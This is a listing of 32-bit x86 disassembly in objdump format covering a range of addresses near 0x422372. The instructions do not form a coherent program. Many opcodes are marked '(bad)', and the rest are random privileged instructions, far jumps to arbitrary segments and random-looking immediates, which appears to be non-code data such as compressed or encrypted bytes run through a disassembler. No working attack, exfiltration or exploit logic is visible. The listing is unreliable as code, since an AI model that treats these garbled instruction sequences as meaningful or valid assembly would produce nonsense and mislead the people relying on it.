  422372:	xchg   edi,eax
  422373:	and    eax,0x3dd7280c
  422378:	fsubr  DWORD PTR [edx]
  42237a:	jl     0x42232e
  42237c:	dec    esp
  42237d:	jecxz  0x422372
  42237f:	adc    al,0x89
  422381:	cld    
  422382:	cmp    ebx,DWORD PTR [edx]
  422384:	jns    0x422367
  422386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422387:	addr16 pop ebx
  422389:	mov    esi,0xb7e73692
  42238e:	imul   ebp,DWORD PTR [edx-0x5e],0x72
  422392:	jmp    0x422377
  422394:	adc    bh,al
  422396:	adc    bh,BYTE PTR [edx-0x11]
  422399:	popa   
  42239a:	ins    BYTE PTR es:[edi],dx
  42239b:	sbb    eax,0xe991864
  4223a0:	(bad)  
  4223a2:	sub    al,0x4
  4223a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223a5:	test   al,0x7c
  4223a7:	add    eax,0x8b55d00b
  4223ac:	loop   0x4223ea
  4223ae:	mov    ebp,0xb906a69b
  4223b3:	popf   
  4223b4:	mov    ebx,0x8d934ce5
  4223b9:	sbb    al,0xf4
  4223bb:	adc    al,0xf3
  4223bd:	push   ebx
  4223be:	push   ebx
  4223bf:	mov    ah,0x56
  4223c1:	clc    
  4223c2:	jle    0x4223fe
  4223c4:	add    al,0x9b
  4223c6:	fimul  WORD PTR [ebp+edx*8-0x6e]
  4223ca:	inc    edx
  4223cb:	mov    esp,0x48d5c7ea
  4223d0:	scas   eax,DWORD PTR es:[edi]
  4223d1:	add    al,0xd0
  4223d3:	push   0xb
  4223d5:	imul   esi,DWORD PTR gs:[edx-0x1d76d6c2],0xffffffd5
  4223dd:	sub    eax,0x186f2270
  4223e2:	retf   0xe1d1
  4223e5:	mov    ebp,0x6e0118cb
  4223ea:	pop    edx
  4223eb:	ret    0x57bf
  4223ee:	leave  
  4223ef:	sub    DWORD PTR [ecx-0xf],ecx
  4223f2:	lods   al,BYTE PTR ds:[esi]
  4223f3:	pop    es
  4223f4:	add    DWORD PTR [eax-0xd],0xffffff86
  4223f8:	scas   al,BYTE PTR es:[edi]
  4223f9:	jno    0x422477
  4223fb:	push   ebp
  4223fc:	retf   0xd0f2
  4223ff:	adc    DWORD PTR [eax],ebp
  422401:	sti    
  422402:	jb     0x422409
  422404:	pop    edx
  422405:	xor    bl,BYTE PTR [ebp+0x3f]
  422408:	mov    dl,0xf9
  42240a:	idiv   BYTE PTR [ebp+0x4c]
  42240d:	and    eax,0x2f038178
  422412:	push   edx
  422413:	sbb    edx,DWORD PTR [ebx-0x288cbef9]
  422419:	xchg   ebx,eax
  42241a:	aam    0x19
  42241c:	adc    DWORD PTR [ecx-0x2ffd078d],esp
  422422:	mov    ebp,0xc82069c3
  422427:	xchg   ah,bh
  422429:	mov    ds:0x748bd304,al
  42242e:	or     al,0xd6
  422430:	adc    DWORD PTR [esi],0x6f
  422433:	push   es
  422434:	add    edi,ecx
  422436:	pop    edx
  422437:	stos   DWORD PTR es:[edi],eax
  422438:	stos   BYTE PTR es:[edi],al
  422439:	scas   eax,DWORD PTR es:[edi]
  42243a:	and    DWORD PTR [ebp-0x5eb9cabb],esp
  422440:	mov    cl,0xac
  422442:	pop    es
  422443:	rol    al,1
  422445:	lds    ecx,FWORD PTR [eax+0x2f]
  422448:	mov    ds:0x2241fe51,al
  42244d:	rcr    DWORD PTR [ebp-0x3],1
  422450:	(bad)  
  422451:	int    0xf4
  422453:	out    0xf,eax
  422455:	sbb    BYTE PTR [edi-0x5e],dh
  422458:	sti    
  422459:	les    ebx,FWORD PTR [ecx+ecx*2+0x6e428b53]
  422460:	sub    eax,0x82b66ea6
  422465:	sub    BYTE PTR [ebx],cl
  422467:	int    0xe1
  422469:	data16 xor BYTE PTR [ecx+0x73],bh
  42246d:	push   edi
  42246e:	gs and al,ah
  422471:	punpckhwd mm0,mm5
  422474:	in     al,0x81
  422476:	inc    eax
  422477:	push   0xfcee2380
  42247c:	jl     0x422448
  42247e:	fld    QWORD PTR [ecx-0x295617de]
  422484:	loopne 0x42248a
  422486:	fadd   DWORD PTR [edi-0x5b]
  422489:	rcl    BYTE PTR [edx],1
  42248b:	fidivr WORD PTR [ecx-0x13fe5925]
  422491:	test   eax,0x64126ab1
  422496:	mov    esi,0x33767f8d
  42249b:	mov    edx,0x8c6692e8
  4224a0:	jg     0x4224bc
  4224a2:	clc    
  4224a3:	loop   0x422512
  4224a5:	add    ebp,DWORD PTR [esi-0x6823b2a4]
  4224ab:	mov    esi,0xaf3262a1
  4224b0:	jo     0x42251e
  4224b2:	xchg   DWORD PTR [ebx+0x62],esi
  4224b5:	scas   al,BYTE PTR es:[edi]
  4224b6:	dec    edx
  4224b7:	out    0x59,eax
  4224b9:	jns    0x4224be
  4224bb:	xor    eax,0x2c9ec0fa
  4224c0:	(bad)  
  4224c1:	aam    0xce
  4224c3:	daa    
  4224c4:	popf   
  4224c5:	ror    BYTE PTR [eax+0x6d17daa4],0x48
  4224cc:	outs   dx,DWORD PTR ds:[esi]
  4224cd:	lods   al,BYTE PTR ds:[esi]
  4224ce:	icebp  
  4224cf:	and    ah,BYTE PTR [edx+0x49378787]
  4224d5:	repz shl DWORD PTR [edi],1
  4224d8:	dec    ebx
  4224d9:	scas   eax,DWORD PTR es:[edi]
  4224da:	in     eax,dx
  4224db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224dc:	bound  ecx,QWORD PTR [ecx]
  4224de:	fdiv   DWORD PTR [ecx+0x4dac7f1]
  4224e4:	push   ecx
  4224e5:	push   cs
  4224e6:	(bad)  
  4224e7:	in     eax,0xa7
  4224e9:	fld    DWORD PTR [ecx-0x30]
  4224ec:	ror    BYTE PTR [edi+0x51],cl
  4224ef:	cmp    BYTE PTR [edx+0xa],bh
  4224f2:	mov    eax,ds:0xfa85aca6
  4224f8:	inc    ecx
  4224f9:	dec    edx
  4224fa:	(bad)  
  4224fb:	loopne 0x422532
  4224fd:	mov    ds:0x872d2fe2,al
  422502:	arpl   WORD PTR [ecx*4-0x744e37e6],di
  422509:	inc    edi
  42250a:	inc    ebx
  42250b:	out    0xc,eax
  42250d:	rol    DWORD PTR [ecx+0x4426f0],cl
  422513:	mov    eax,ds:0x73bbe76e
  422518:	xor    bh,BYTE PTR [eax-0x11d88eff]
  42251e:	enter  0xa3d1,0x12
  422522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422523:	pop    ecx
  422524:	add    BYTE PTR [edx-0x46],ch
  422527:	jmp    0x42256d
  422529:	mov    ch,0x20
  42252b:	rcr    DWORD PTR ds:0xe58a4f08,1
  422531:	sub    eax,0x4ebe4082
  422536:	into   
  422537:	adc    eax,0x4966107c
  42253c:	dec    edx
  42253e:	sub    eax,0x544c6a18
  422543:	arpl   WORD PTR [ecx+esi*4-0x72af2a],si
  42254a:	pop    esi
  42254b:	(bad)  
  42254d:	mov    ds:0x334fcf6a,al
  422552:	adc    eax,0x42d17984
  422557:	in     eax,dx
  422558:	into   
  422559:	jmp    0xb92e:0x9267f5da
  422560:	into   
  422561:	mov    ds:0x5bccae45,eax
  422566:	sub    BYTE PTR [ebx-0x51],bh
  422569:	sub    eax,0x9fbe36b2
  42256e:	cmc    
  42256f:	mov    ebx,0x5346a705
  422574:	inc    DWORD PTR [ebx]
  422576:	mov    al,ds:0x8061b9b4
  42257b:	div    DWORD PTR [ebx+0x49]
  42257e:	test   BYTE PTR [edi],0x64
  422581:	pop    edx
  422582:	sub    al,0x37
  422584:	mov    dh,BYTE PTR [edi-0x58]
  422587:	es stos DWORD PTR es:[edi],eax
  422589:	push   ebp
  42258a:	push   0x487d2f9d
  42258f:	add    ecx,esi
  422591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422592:	jmp    0x45622163
  422597:	add    eax,esi
  422599:	scas   al,BYTE PTR es:[edi]
  42259a:	xchg   BYTE PTR [ebp+0x16],dl
  42259d:	mov    ch,0xf1
  42259f:	xor    DWORD PTR [esi],ebx
  4225a1:	call   0x689089d1
  4225a6:	cmp    al,0x58
  4225a8:	arpl   di,bx
  4225aa:	pop    ebx
  4225ab:	ret    0x2e87
  4225ae:	out    0x23,al
  4225b0:	fld    TBYTE PTR [ecx-0x32]
  4225b3:	add    al,0xef
  4225b5:	mov    esp,0xf279403d
  4225ba:	leave  
  4225bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225bc:	pop    esp
  4225bd:	push   0x4f31b533
  4225c2:	and    bl,BYTE PTR [edi]
  4225c4:	jle    0x4225a2
  4225c6:	test   DWORD PTR [ecx+0x63],eax
  4225c9:	cmp    ch,BYTE PTR ds:0x1c907e7b
  4225cf:	aam    0x3a
  4225d1:	test   eax,0x5d813ad1
  4225d6:	mov    cs,WORD PTR [ebx+0x25]
  4225d9:	mov    ecx,0xe3828ed6
  4225de:	arpl   WORD PTR [esi+0x22bcab09],ax
  4225e4:	ret    
  4225e5:	mov    dl,0x6b
  4225e7:	ds mov bh,0x24
  4225ea:	push   es
  4225eb:	and    DWORD PTR [esi+0x2d085c84],ebp
  4225f1:	sahf   
  4225f2:	(bad)  
  4225f5:	cmp    al,BYTE PTR [esp+edx*2-0xc]
  4225f9:	mov    edx,0x84dac228
  4225fe:	mov    fs,WORD PTR [edi-0x2a]
  422601:	xchg   ecx,eax
  422602:	imul   edx,DWORD PTR [esi],0x1cf7ea00
  422608:	dec    eax
  422609:	sub    BYTE PTR [edx],0x37
  42260c:	xchg   ebx,eax
  42260d:	mov    esi,0x69a81ff0
  422612:	mov    cl,0x35
  422614:	sbb    ebx,esi
  422616:	shl    bl,0x73
  422619:	inc    ebp
  42261a:	adc    cl,dh
  42261c:	fidiv  DWORD PTR [ecx-0x4c]
  42261f:	sub    BYTE PTR [edx],0xd1
  422622:	jb     0x422674
  422624:	pop    ebx
  422625:	add    BYTE PTR [ebx+edi*8+0x3acdbb74],0x18
  42262d:	repz add BYTE PTR [ebx+0x66],dh
  422631:	scas   eax,DWORD PTR es:[edi]
  422632:	into   
  422633:	jnp    0x422631
  422635:	push   ebx
  422636:	in     eax,0xa5
  422638:	cmc    
  422639:	xchg   BYTE PTR [ebx+esi*8-0x129d862],bl
  422640:	mov    ebp,0x4a5cfdc4
  422645:	int    0xdc
  422647:	popa   
  422648:	adc    DWORD PTR ds:0x9c80c401,0xcee0a6a7
  422652:	test   eax,0xf1c3b8c7
  422657:	jae    0x422659
  422659:	dec    edx
  42265a:	into   
  42265b:	rcl    edi,0xf0
  42265e:	in     eax,dx
  42265f:	std    
  422660:	add    WORD PTR [ecx-0x69],di
  422664:	(bad)  
  422665:	out    dx,al
  422666:	loop   0x4226b0
  422668:	out    0xc5,al
  42266a:	stos   BYTE PTR es:[edi],al
  42266b:	out    0x11,al
  42266d:	les    ecx,FWORD PTR [ebp-0x493926a2]
  422673:	and    BYTE PTR [ecx+0x773549e5],0x1b
  42267a:	dec    edi
  42267b:	xchg   BYTE PTR [ecx+0x15316937],dl
  422681:	dec    edi
  422682:	aas    
  422683:	cld    
  422684:	adc    al,0xb
  422686:	cmp    BYTE PTR [edx+0x5386e55d],dh
  42268c:	jo     0x422653
  42268e:	ins    DWORD PTR es:[edi],dx
  42268f:	jmp    0x889555a4
  422694:	stos   DWORD PTR es:[edi],eax
  422695:	or     ch,dh
  422697:	mov    ss,WORD PTR [edi]
  422699:	adc    eax,0x4be6eed7
  42269e:	jne    0x42264d
  4226a0:	adc    BYTE PTR [edx],ah
  4226a2:	pop    ebx
  4226a3:	push   ds
  4226a4:	or     ah,BYTE PTR [eax+0x3011c525]
  4226aa:	fs std 
  4226ac:	fs push cs
  4226ae:	inc    edi
  4226af:	add    edi,ebx
  4226b1:	mov    ?,ebp
  4226b3:	pop    ebx
  4226b4:	loop   0x422670
  4226b6:	cld    
  4226b7:	int3   
  4226b8:	bound  esp,QWORD PTR [edx-0x6a]
  4226bb:	cmp    eax,0xa400c5d4
  4226c0:	mov    ch,0xf2
  4226c2:	mov    ah,0x63
  4226c4:	dec    esi
  4226c5:	xor    al,0x17
  4226c7:	in     eax,0xca
  4226c9:	jmp    0xef5d8cb3
  4226ce:	(bad)  
  4226d0:	fimul  WORD PTR [eax+0x10c3831b]
  4226d6:	ret    
  4226d7:	(bad)  
  4226d8:	js     0x4226d2
  4226da:	push   edi
  4226db:	push   0xfd1c3b56
  4226e0:	dec    ebp
  4226e1:	aam    0x93
  4226e3:	dec    esi
  4226e4:	push   ds
  4226e5:	inc    esi
  4226e6:	gs push esp
  4226e8:	clc    
  4226e9:	lds    ecx,FWORD PTR [ecx-0x1eced0d5]
  4226ef:	mov    es,WORD PTR [ecx-0x4d]
  4226f2:	ficomp WORD PTR [edi+0x50]
  4226f5:	pop    ss
  4226f6:	inc    ebx
  4226f7:	mov    eax,?
  4226f9:	adc    BYTE PTR [edi+0x6],cl
  4226fc:	rol    BYTE PTR [ecx+0x72],1
  4226ff:	(bad)  
  422701:	fcom   st(3)
  422703:	sbb    DWORD PTR [ecx],esi
  422705:	mov    ebx,0x39716bdf
  42270a:	cmp    al,0x7c
  42270c:	jmp    0x79bbdee0
  422711:	pop    es
  422712:	cli    
  422713:	mov    edx,0x781e8bdd
  422718:	aam    0x62
  42271a:	inc    edx
  42271b:	(bad)  
  42271c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42271d:	dec    edi
  42271e:	scas   al,BYTE PTR es:[edi]
  42271f:	sar    DWORD PTR [edx],cl
  422721:	in     eax,0x68
  422723:	mov    ebp,0xe9aafa56
  422728:	jno    0x422754
  42272a:	push   0xffffff97
  42272c:	scas   al,BYTE PTR es:[edi]
  42272d:	gs aad 0xb5
  422730:	xchg   ebp,eax
  422731:	dec    ecx
  422732:	mov    eax,ds:0x10d80721
  422737:	pop    edx
  422738:	adc    eax,0x29b3467b
  42273d:	xchg   esi,eax
  42273e:	lds    edi,FWORD PTR [edx+edx*2-0x3bdeab3b]
  422745:	iret   
  422746:	mov    edi,0xe6deb329
  42274b:	iret   
  42274c:	shl    BYTE PTR [edi-0x4442dded],1
  422752:	add    al,0x5a
  422754:	jp     0x422759
  422756:	jno    0x422775
  422758:	inc    esp
  422759:	int    0xc2
  42275b:	pop    edx
  42275c:	mov    al,0xca
  42275e:	pop    esi
  42275f:	ins    DWORD PTR es:[edi],dx
  422760:	aas    
  422761:	sub    eax,0x22b193a6
  422766:	(bad)
  422769:	sub    cl,BYTE PTR [ebp-0x3f3407f6]
  42276f:	cli    
  422770:	cmp    DWORD PTR [esi+0x21],0x4b1f9aed
  422777:	test   eax,0x1ed00db5
  42277c:	push   ebx
  42277d:	cmp    dh,ah
  42277f:	push   0xd0027658
  422784:	pusha  
  422785:	xor    cl,BYTE PTR [edx+0x2048f069]
  42278b:	lock scas eax,DWORD PTR es:[edi]
  42278d:	vaddps ymm2,ymm6,YMMWORD PTR [edi-0x55]
  422792:	addr16 mov dl,0xc9
  422795:	or     DWORD PTR [ebp+0x30],edx
  422798:	fndisi(8087 only) 
  42279a:	push   edx
  42279b:	mov    bh,0xaf
  42279d:	not    dl
  42279f:	adc    al,0x3d
  4227a1:	xchg   esi,eax
  4227a2:	enter  0x3429,0x75
  4227a6:	push   esi
  4227a7:	cmc    
  4227a8:	les    edi,FWORD PTR [edi+0x2e13c319]
  4227ae:	ret    
  4227af:	xor    dl,BYTE PTR ds:0x3de71398
  4227b5:	pop    eax
  4227b6:	gs jl  0x4227dc
  4227b9:	pop    DWORD PTR [edx+0x31b52380]
  4227bf:	or     edx,DWORD PTR ds:0x863a0a82
  4227c5:	lods   al,BYTE PTR ds:[esi]
  4227c6:	pop    edi
  4227c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c8:	lods   al,BYTE PTR ds:[esi]
  4227c9:	nop
  4227ca:	push   0x2a
  4227cc:	push   ecx
  4227cd:	mov    dh,0x32
  4227cf:	pop    ecx
  4227d0:	adc    al,0x3a
  4227d2:	ret    0x294
  4227d5:	pop    es
  4227d6:	mov    edi,0x7f097326
  4227db:	jp     0x4227c5
  4227dd:	mov    ss,ecx
  4227df:	push   0xffffffbe
  4227e1:	js     0x422806
  4227e3:	xchg   BYTE PTR [ebp+0x3e],cl
  4227e6:	aaa    
  4227e7:	push   0xf95006ab
  4227ec:	sbb    eax,0xe9797cdd
  4227f1:	scas   al,BYTE PTR es:[edi]
  4227f2:	hlt    
  4227f3:	sahf   
  4227f4:	cmp    al,0x27
  4227f6:	mov    al,0x4
  4227f8:	pop    edi
  4227f9:	enter  0xc224,0x80
  4227fd:	adc    ebx,DWORD PTR [ebp-0xa61414]
  422803:	icebp  
  422804:	scas   al,BYTE PTR es:[edi]
  422805:	test   DWORD PTR [ecx],ebx
  422807:	mov    esp,0x4a043b09
  42280c:	pop    ebx
  42280d:	rcr    DWORD PTR [edx-0x505d6504],1
  422813:	inc    edx
  422814:	push   es
  422815:	cmp    al,0x63
  422817:	imul   dl
  422819:	pop    ds
  42281a:	jl     0x422862
  42281c:	shl    DWORD PTR [edx],1
  42281e:	jl     0x422840
  422820:	cwde   
  422821:	pop    ebx
  422822:	shr    BYTE PTR [eax],cl
  422824:	mov    ah,0xf9
  422826:	dec    edi
  422827:	adc    al,0x40
  422829:	xchg   edx,eax
  42282a:	pop    ebx
  42282b:	fsub   DWORD PTR [esi+0x7866a344]
  422831:	sub    BYTE PTR ds:0x4190e19d,ch
  422837:	hlt    
  422838:	leave  
  422839:	jle    0x422826
  42283b:	out    0xc6,al
  42283d:	enter  0xe403,0xc3
  422841:	ret    
  422842:	cld    
  422843:	sub    esi,DWORD PTR [ebp+0x6f]
  422846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422847:	into   
  422848:	mov    cl,0x84
  42284a:	ror    ebp,0x76
  42284d:	out    dx,eax
  42284e:	and    dh,ch
  422850:	scas   al,BYTE PTR es:[edi]
  422851:	aad    0x36
  422853:	ins    DWORD PTR es:[edi],dx
  422854:	pop    es
  422855:	adc    DWORD PTR [esi],0x42
  422858:	icebp  
  422859:	fs test al,0xe3
  42285c:	cmp    al,BYTE PTR [ebx+eax*1]
  42285f:	xor    DWORD PTR [ecx+0x3c],0xc01f0aed
  422866:	fcmovbe st,st(2)
  422868:	and    ah,BYTE PTR [ecx]
  42286a:	mov    ds:0x2fe16c51,eax
  42286f:	in     al,0xac
  422871:	outs   dx,DWORD PTR ds:[si]
  422873:	stos   BYTE PTR es:[edi],al
  422874:	jo     0x422874
  422876:	xor    eax,0xb88badcf
  42287b:	and    al,0x98
  42287d:	jmp    0x57bb:0x356684fb
  422884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422885:	cmp    DWORD PTR [ebp+0x34],0x1abeffd6
  42288c:	(bad)  
  42288d:	add    eax,0xdc8ba25d
  422892:	(bad)  
  422893:	ins    BYTE PTR es:[edi],dx
  422894:	xchg   edi,eax
  422895:	jns    0x422864
  422897:	xchg   ebx,eax
  422898:	xor    BYTE PTR [eax],ch
  42289a:	xor    esp,DWORD PTR cs:[ecx]
  42289d:	nop
  42289e:	retf   
  42289f:	leave  
  4228a0:	pop    es
  4228a1:	aad    0x5c
  4228a3:	call   0x75c1:0xea438882
  4228aa:	dec    esi
  4228ab:	neg    ebp
  4228ad:	ins    DWORD PTR es:[edi],dx
  4228ae:	xchg   esi,eax
  4228af:	dec    esp
  4228b0:	stos   DWORD PTR es:[edi],eax
  4228b1:	test   DWORD PTR [esi-0xd],ebx
  4228b4:	idiv   bl
  4228b6:	aaa    
  4228b7:	bound  ecx,QWORD PTR [esi]
  4228b9:	sahf   
  4228ba:	(bad)  
  4228bb:	push   ss
  4228bc:	shl    BYTE PTR [ecx-0x6174d9eb],cl
  4228c2:	popf   
  4228c3:	jle    0x42293f
  4228c5:	dec    esp
  4228c6:	sti    
  4228c7:	shl    DWORD PTR [edi-0x645566f5],0xa3
  4228ce:	pop    ds
  4228cf:	jle    0x42292a
  4228d1:	pop    edi
  4228d2:	pop    ds
  4228d3:	push   edx
  4228d4:	bt     ecx,edi
  4228d7:	ret    0x7d34
  4228da:	lods   eax,DWORD PTR ds:[esi]
  4228db:	stc    
  4228dc:	dec    BYTE PTR [ecx+edi*8+0x5315904e]
  4228e3:	jl     0x42292d
  4228e5:	dec    edi
  4228e6:	inc    edx
  4228e7:	cmp    BYTE PTR [ecx+ecx*8],ch
  4228ea:	adc    ebx,eax
  4228ec:	sub    edx,edx
  4228ee:	adc    BYTE PTR [ebx+esi*1],ah
  4228f1:	xor    BYTE PTR [eax-0x56380508],al
  4228f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228f8:	jmp    0x9316aeae
  4228fd:	mov    ebx,DWORD PTR [edi+ebx*4+0x64d3f304]
  422904:	shr    bl,0x2f
  422907:	xchg   ecx,eax
  422908:	push   0xf187c565
  42290d:	lahf   
  42290e:	aaa    
  42290f:	cld    
  422910:	loope  0x422959
  422912:	js     0x422896
  422914:	test   eax,0x61c10d4c
  422919:	hlt    
  42291a:	mov    esi,0x82edf318
  42291f:	pop    eax
  422920:	jo     0x4228d0
  422922:	dec    ebx
  422923:	dec    esi
  422924:	or     DWORD PTR [ecx+eiz*2+0x54ba3fd5],ecx
  42292b:	mov    eax,0x1ddf6db0
  422930:	stc    
  422931:	dec    ecx
  422932:	call   0xf862:0x8b0f737e
  422939:	cld    
  42293a:	addr16 push esi
  42293c:	xor    esi,DWORD PTR [esi]
  42293e:	stc    
  42293f:	and    al,0x21
  422941:	push   edi
  422942:	cwde   
  422943:	rcr    BYTE PTR [eax+0x19],1
  422946:	mov    al,ds:0xb80e5807
  42294b:	call   0x99d0280c
  422950:	gs pop ecx
  422952:	fsub   DWORD PTR [edx+0x23]
  422955:	iret   
  422956:	fdiv   DWORD PTR [edi+0x77]
  422959:	mov    bl,0x2a
  42295b:	sbb    eax,0xbca87c98
  422960:	call   0x8b16075c
  422965:	ins    BYTE PTR es:[edi],dx
  422966:	sbb    al,0xd7
  422968:	scas   eax,DWORD PTR es:[edi]
  422969:	cmp    esi,DWORD PTR ds:0x7da8ff3f
  42296f:	adc    ch,dh
  422971:	jbe    0x42295a
  422973:	pop    ss
  422974:	retf   
  422975:	cs push edx
  422977:	loopne 0x42295f
  422979:	scas   al,BYTE PTR es:[edi]
  42297a:	and    DWORD PTR [eax],ebp
  42297c:	sub    BYTE PTR ds:0x7d31f05c,dh
  422982:	das    
  422983:	repnz popa 
  422985:	ja     0x42298d
  422987:	lods   eax,DWORD PTR ds:[esi]
  422988:	ret    
  422989:	and    DWORD PTR [edi],edx
  42298b:	cld    
  42298c:	add    DWORD PTR [ebx-0x49],esp
  42298f:	inc    esp
  422990:	inc    edi
  422991:	addr16 cmp al,0xa8
  422994:	and    DWORD PTR [esi],ecx
  422996:	jne    0x4229fe
  422998:	cld    
  422999:	jge    0x422a10
  42299b:	dec    ecx
  42299c:	xchg   ebp,eax
  42299d:	dec    eax
  42299e:	pop    edx
  42299f:	xchg   ecx,eax
  4229a0:	outs   dx,BYTE PTR ds:[esi]
  4229a1:	or     DWORD PTR [ebx],ebx
  4229a3:	push   DWORD PTR [ebx]
  4229a5:	dec    edi
  4229a6:	aaa    
  4229a7:	or     edi,0xf1a17247
  4229ad:	inc    edx
  4229ae:	xchg   esp,eax
  4229af:	add    eax,0x219f2f0c
  4229b4:	call   0xfa1d:0xb2cc3964
  4229bb:	jnp    0x422941
  4229bd:	or     ebp,DWORD PTR [edi-0x4c67e860]
  4229c3:	and    esp,DWORD PTR [ebx]
  4229c5:	lods   al,BYTE PTR ds:[esi]
  4229c6:	or     al,BYTE PTR [esi-0x15]
  4229c9:	push   ss
  4229ca:	mov    edx,0x6d38d427
  4229cf:	lods   al,BYTE PTR ds:[esi]
  4229d0:	fdiv   QWORD PTR [esi-0x3c8d9ee]
  4229d6:	inc    edx
  4229d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229d8:	fisttp WORD PTR [edx-0x63]
  4229db:	push   ebx
  4229dc:	lods   eax,DWORD PTR ds:[esi]
  4229dd:	and    ah,cl
  4229df:	push   ss
  4229e0:	test   eax,0xf81fd77d
  4229e5:	fiadd  WORD PTR [edx+edi*8]
  4229e8:	sub    DWORD PTR [ecx],eax
  4229ea:	jae    0x422a02
  4229ec:	mov    cl,0x45
  4229ee:	lds    ecx,FWORD PTR [ebp+0x5dd2f86f]
  4229f4:	sbb    eax,0xe03e2681
  4229f9:	adc    BYTE PTR [edi+0x3ded175],0xba
  422a00:	xor    BYTE PTR [edx+0x76],ch
  422a03:	dec    ecx
  422a04:	push   ebp
  422a05:	adc    DWORD PTR [ebp-0x47ea7e5c],ebp
  422a0b:	mov    ?,ebp
  422a0d:	arpl   WORD PTR [esp+edi*8-0x252134c9],di
  422a14:	pusha  
  422a15:	das    
  422a16:	bnd ja 0x4229bc
  422a19:	mov    eax,0x218f39cc
  422a1e:	and    ecx,DWORD PTR [edi+0x23]
  422a21:	jmp    0x4229d3
  422a23:	jecxz  0x4229c0
  422a25:	add    al,0x86
  422a27:	pop    es
  422a28:	icebp  
  422a29:	pop    edi
  422a2a:	clc    
  422a2b:	adc    eax,edi
  422a2d:	(bad)  
  422a2e:	xchg   esp,eax
  422a2f:	jl     0x422a0e
  422a31:	sti    
  422a32:	jae    0x422aa7
  422a34:	add    BYTE PTR ds:[edx],cl
  422a37:	test   DWORD PTR [ecx],0x5f071fa9
  422a3d:	add    eax,0x342c7e1b
  422a42:	test   edi,0x8ad86591
  422a48:	cmp    ecx,DWORD PTR [eax]
  422a4a:	mov    ebx,esi
  422a4c:	mov    ebx,0x4e5b1b08
  422a51:	jb     0x422acb
  422a53:	mov    ah,0x7b
  422a55:	in     eax,0x9f
  422a57:	(bad)  
  422a59:	pop    edi
  422a5a:	inc    ebp
  422a5b:	mov    ecx,0xd322cd2b
  422a60:	push   edi
  422a61:	iret   
  422a62:	mov    edi,0x81886962
  422a67:	fdivr  DWORD PTR [eax+0x5f59a0a3]
  422a6d:	test   al,0x4a
  422a6f:	mov    dh,0x6d
  422a71:	or     ecx,ebp
  422a73:	mov    bh,0xf3
  422a75:	add    DWORD PTR [ecx],0xb0895f70
  422a7b:	mov    ds:0x5e0b8a51,eax
  422a80:	and    eax,0x89a16160
  422a85:	aas    
  422a86:	jb     0x422a3c
  422a88:	das    
  422a89:	shl    DWORD PTR [ecx+eax*4],cl
  422a8c:	or     al,0xae
  422a8e:	in     al,dx
  422a8f:	jle    0x422acd
  422a91:	in     eax,0x27
  422a93:	sub    DWORD PTR [edx],ebx
  422a95:	jbe    0x422add
  422a97:	cmp    eax,0xb4b6edbd
  422a9c:	mov    dh,0x94
  422a9e:	mov    ds,WORD PTR [ebp-0xc66f2b]
  422aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422aa5:	mov    WORD PTR [edx+0x59],gs
  422aa8:	fst    QWORD PTR [edx+0x224fcd2a]
  422aae:	imul   edi,DWORD PTR [eax-0x6cf21df4],0x4b
  422ab5:	xor    eax,edx
  422ab7:	or     BYTE PTR [edi+0x4d],0xe8
  422abb:	cli    
  422abc:	dec    eax
  422abd:	ja     0x422b30
  422abf:	pop    esp
  422ac0:	mov    ss,WORD PTR [esi+0x336655ff]
  422ac6:	outs   dx,DWORD PTR ds:[esi]
  422ac7:	dec    ecx
  422ac8:	imul   ebx,ebp,0xffffffd2
  422acb:	and    ebp,esi
  422acd:	repnz rcl DWORD PTR [esi+eiz*8-0x3a317d0c],1
  422ad5:	imul   ebx,edx,0xffffffcf
  422ad8:	test   eax,0x375f82db
  422add:	xor    DWORD PTR [ecx+0x6f],esi
  422ae0:	pop    es
  422ae1:	push   ds
  422ae2:	mov    bh,0x65
  422ae4:	mov    ds:0x8e0eb1cc,al
  422ae9:	push   edi
  422aea:	loopne 0x422b6a
  422aec:	out    0x6e,eax
  422aee:	mov    esi,0xf6350592
  422af3:	bound  edx,QWORD PTR [edi+0x1b]
  422af6:	call   0xd439c3a2
  422afb:	mov    ebp,esp
  422afd:	jne    0x422aa3
  422aff:	mov    edi,0x51969c98
  422b04:	push   ebp
  422b05:	jne    0x422aa8
  422b07:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  422b09:	jno    0x422b36
  422b0b:	out    dx,al
  422b0c:	lods   al,BYTE PTR ds:[esi]
  422b0d:	(bad)  
  422b0e:	and    bh,BYTE PTR [esp+ebp*4+0x55174065]
  422b15:	pop    ecx
  422b16:	ror    BYTE PTR [eax-0x3b],1
  422b19:	imul   esi,eax,0xa211c145
  422b1f:	cmp    dh,BYTE PTR [edi+0x64345ea4]
  422b25:	add    ah,BYTE PTR [eax]
  422b27:	in     al,dx
  422b28:	add    al,0x4a
  422b2a:	in     eax,dx
  422b2b:	icebp  
  422b2c:	es mov edx,0xa74bae07
  422b32:	(bad)  [ebp-0xf]
  422b35:	into   
  422b36:	dec    eax
  422b37:	repz pop eax
  422b39:	mov    al,0x50
  422b3b:	int3   
  422b3c:	jge    0x422b4a
  422b3e:	retf   
  422b3f:	mov    ecx,edx
  422b41:	pop    ebx
  422b42:	mov    eax,0x48561500
  422b47:	js     0x422b96
  422b49:	je     0x422ae5
  422b4b:	xor    al,0xc7
  422b4d:	xor    BYTE PTR [edx+0x31],al
  422b50:	in     eax,0x51
  422b52:	out    0x76,eax
  422b54:	dec    eax
  422b55:	mov    BYTE PTR ss:[ebx+0x15a94601],bl
  422b5c:	xchg   esi,eax
  422b5d:	hlt    
  422b5e:	inc    ecx
  422b5f:	stos   DWORD PTR es:[edi],eax
  422b60:	pop    ecx
  422b61:	cmp    esi,edx
  422b63:	jmp    0x422b03
  422b65:	adc    DWORD PTR [eax],edx
  422b67:	jmp    0x422b0f
